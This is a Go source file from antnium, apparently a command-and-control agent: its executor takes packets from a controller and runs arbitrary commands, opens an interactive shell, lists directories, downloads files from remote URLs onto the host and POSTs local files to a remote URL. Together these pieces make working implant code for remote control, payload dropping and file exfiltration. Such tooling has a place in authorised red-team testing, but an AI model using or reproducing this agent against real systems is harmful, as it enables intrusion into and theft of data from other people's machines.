package executor

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

type Executor struct {
	interactiveShell *InteractiveShell
}

func MakeExecutor() Executor {
	interactiveShell := MakeInteractiveShell()
	executor := Executor{
		&interactiveShell,
	}
	return executor
}

// Execute will execute the packet according to its PacketType
// and return the packet with packet.Response set containing the details of the execution
// and error when something went wrong
func (p *Executor) Execute(packet model.Packet) (model.Packet, error) {
	var err error

	log.WithFields(log.Fields{
		"1_computerId":   packet.ComputerId,
		"2_packetId":     packet.PacketId,
		"3_downstreamId": packet.DownstreamId,
		"4_packetType":   packet.PacketType,
		"5_arguments":    packet.Arguments,
	}).Info("Exec")

	switch packet.PacketType {
	case "ping":
		packet.Response, err = p.actionPing(packet.Arguments)
	case "test":
		packet.Response, err = p.actionTest(packet.Arguments)
	case "shutdown":
		packet.Response, err = p.actionShutdown(packet.Arguments)
	case "exec":
		packet.Response, err = p.actionExec(packet.Arguments)
	case "fileupload":
		packet.Response, err = p.actionFileupload(packet.Arguments)
	case "filedownload":
		packet.Response, err = p.actionFiledownload(packet.Arguments)
	case "iOpen":
		packet.Response, err = p.actionInteractiveShellOpen(packet.Arguments)
	case "iIssue":
		packet.Response, err = p.actionInteractiveShellIssue(packet.Arguments)
	case "iClose":
		packet.Response, err = p.actionInteractiveShellClose(packet.Arguments)
	case "dir":
		packet.Response, err = p.actionDir(packet.Arguments)
	default:
		packet.Response = make(model.PacketResponse)
		packet.Response["error"] = "packet type not known: " + packet.PacketType
	}

	// Add any errors to the packet response
	if err != nil {
		packet.Response["error"] = err.Error()
		return packet, err
	}

	return packet, nil
}

func (p *Executor) actionInteractiveShellOpen(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	_, force := packetArgument["force"]

	executable, args, err := model.MakePacketArgumentFrom(packetArgument)
	if err != nil {
		return ret, err
	}

	if p.interactiveShell.AlreadyOpen() && !force {
		return ret, fmt.Errorf("already_open")
	} else {
		if p.interactiveShell.AlreadyOpen() {
			p.interactiveShell.execCmd.Process.Kill()
		}
		stdout, stderr, err := p.interactiveShell.Open(executable, args)
		if err != nil {
			return ret, err
		}

		ret["stdout"] = stdout
		ret["stderr"] = stderr
		return ret, nil
	}
}

func (p *Executor) actionInteractiveShellIssue(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	// Check and transform input
	commandline, ok := packetArgument["commandline"]
	if !ok {
		return ret, fmt.Errorf("No argument 'commandline' given")
	}

	stdout, stderr, err := p.interactiveShell.Issue(commandline)
	if err != nil {
		return ret, err
	}
	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret, nil
}

func (p *Executor) actionShutdown(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	os.Exit(0)
	return nil, nil // Never reached
}

func (p *Executor) actionInteractiveShellClose(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	err := p.interactiveShell.Close()
	if err != nil {
		ret["error"] = err.Error()
		ret["stdout"] = "closed"
	} else {
		ret["status"] = "no error"
		ret["stdout"] = "closed"
	}

	return ret, nil
}

func (p *Executor) actionPing(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "ping answer"
	return ret, nil
}

func (p *Executor) actionTest(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)
	ret["response"] = "response"
	return ret, nil
}

func (p *Executor) actionExec(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input done in there sadly
	stdout, stderr, pid, exitCode, err := arch.Exec(packetArgument)

	ret["stdout"] = arch.ExecOutputDecode(stdout)
	ret["stderr"] = arch.ExecOutputDecode(stderr)
	ret["pid"] = strconv.Itoa(pid)
	ret["exitCode"] = strconv.Itoa(exitCode)

	return ret, err
}

func (p *Executor) actionFiledownload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteUrl' given")
	}
	destination, ok := packetArgument["destination"]
	if !ok {
		return ret, fmt.Errorf("No argument 'destination' given")
	}
	//if _, err := os.Stat(destination); !errors.Is(err, fs.ErrNotExist) { // GO1.16
	if _, err := os.Stat(destination); err == nil {
		return ret, fmt.Errorf("Destination %s already exists", destination)
	}

	// Download and write file
	resp, err := http.Get(remoteurl)
	if err != nil {
		return ret, err
	}
	defer resp.Body.Close()

	out, err := os.Create(destination)
	if err != nil {
		return ret, err
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Written %d bytes", written)
	return ret, nil
}

func (p *Executor) actionFileupload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	remoteurl, ok := packetArgument["remoteurl"]
	if !ok {
		return ret, fmt.Errorf("No argument 'remoteurl' given")
	}
	source, ok := packetArgument["source"]
	if !ok {
		return ret, fmt.Errorf("No argument 'source' given")
	}
	//if _, err := os.Stat(source); errors.Is(err, fs.ErrNotExist) { // GO1.16
	if _, err := os.Stat(source); err != nil {
		return ret, fmt.Errorf("file %s does not exists", source)
	}

	client := &http.Client{}
	data, err := os.Open(source)
	if err != nil {
		return ret, err
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		return ret, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return ret, err
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return ret, err
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret, nil
}

func (p *Executor) actionDir(packetArgument model.PacketArgument) (model.PacketResponse, error) {
	ret := make(model.PacketResponse)

	// Check and transform input
	path, ok := packetArgument["path"]
	if !ok {
		return ret, fmt.Errorf("No argument 'path' given")
	}

	dirList, err := common.ListDirectory(path)
	if err != nil {
		return ret, err
	}
	json, err := json.Marshal(dirList)
	if err != nil {
		return ret, err
	}

	ret["filelist"] = string(json)

	return ret, nil
}
